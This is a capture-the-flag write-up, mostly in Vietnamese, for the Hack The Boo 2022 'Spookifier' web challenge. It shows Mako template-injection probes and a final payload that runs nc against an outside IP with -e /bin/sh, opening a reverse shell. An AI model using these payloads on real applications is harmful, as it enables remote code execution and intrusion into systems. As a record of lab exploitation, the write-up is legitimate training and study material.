# **Hack The Boo CTF 2022**
## **Spookifier** 
___
### **Description:**

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
```
142.93.35.129:30478
```
___
### **Recon:**

Nhập vào một test và web sẽ render ra 4 font chữ cho ta.

![1.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/1.png)

Nhập vào một test và web sẽ render ra 4 font chữ cho ta.

Sau khi đọc source thì mình biết là web này sử dụng Template Mako. SSTI!

Mình sử dụng [payload](https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/) này và tiến hành test các dự đoán

```
test=${7*'7'}
```
![2.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/2.png)

```
test=${self.module.cache.util.os}
```
![3.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/3.png)


Nhưng mình không thể thực hiện command
```
test=${self.module.cache.util.os.system("id")}
```
![6.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/6.png)

Mình chạy ở máy local và phát hiện command vẫn được thực hiện nhưng lại không xuất kết quả ra cho mình xem. Dùng reverse shell!

![4.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/4.png)

### **Exploit:**

Sau một test thì mình sử dụng:

```
test=${self.module.cache.util.os.system("nc 18.139.9.214 12320 -e /bin/sh")}
```
![5.png](https://github.com/L4P1Nz/Hack-The-Boo/blob/main/Spookifier/img/5.png)
